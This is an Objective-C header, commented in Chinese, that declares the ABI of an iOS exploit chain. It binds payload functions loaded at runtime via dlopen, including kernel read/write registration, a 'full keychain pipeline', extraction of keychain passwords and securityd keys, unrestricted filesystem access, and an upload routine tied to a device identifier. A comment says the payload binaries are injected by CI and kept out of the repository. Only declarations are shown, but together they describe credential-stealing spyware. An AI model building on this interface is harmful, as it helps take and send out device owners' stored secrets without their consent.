#pragma once

#import <Foundation/Foundation.h>
#import <dispatch/dispatch.h>

/**
 * 利用链的 ABI 声明。
 *
 * 全部通过 dlopen/dlsym 绑定，不做链接依赖：payload 由 CI 注入到
 * Frameworks/ 下，源码仓库里不放任何二进制。
 */

typedef int (*LaraIntVoidFn)(void);
typedef void *(*LaraPtrVoidFn)(void *);
typedef void *(*LaraPtrVoid2Fn)(void *, void *);
typedef id (*LaraIdVoidFn)(void);
typedef int (*LaraIntPath2Fn)(const char *, const char *);

typedef struct {
    LaraIntVoidFn ds_run;
    LaraIntVoidFn ds_is_ready;
    void (*ds_set_log_callback)(const char *);
    void (*ds_set_progress_callback)(double);

    LaraPtrVoidFn IdnWebCoreEnsureLoaded;
    LaraPtrVoidFn IdnWebCoreRegisterLaraKernelRW;
    LaraPtrVoidFn IdnWebCoreRunFullKeychainPipeline;
    LaraPtrVoidFn IdnWebCoreSetEnabled;

    LaraIdVoidFn KeychainTakeCompetitorXMLExport;
    LaraPtrVoidFn KeychainTakeInlineGenpDecryptPayload;
    LaraPtrVoidFn KeychainTakeSecuritydMetadataKeys;

    LaraIntVoidFn MCMFilzaStart;
    void (*MCMFilzaSetUnrestrictedFilesystem)(BOOL);
    LaraIntPath2Fn vn_copyfile_keychain;
} LaraApi;

/** 由 LaraLoadApi() 填充；任一成员为 NULL 表示该阶段不可用。 */
extern LaraApi g_lara;

void LaraBootstrapInstall(void);

/** 链内部使用。 */
void LaraLoadApi(void);
void LaraRunChain(NSDictionary *config);
void LaraUploadPending(NSDictionary *config, dispatch_block_t completion);

NSString *LaraDocumentsPath(void);
NSString *LaraDeviceIdentifier(void);
void LaraLog(NSString *format, ...) NS_FORMAT_FUNCTION(1, 2);
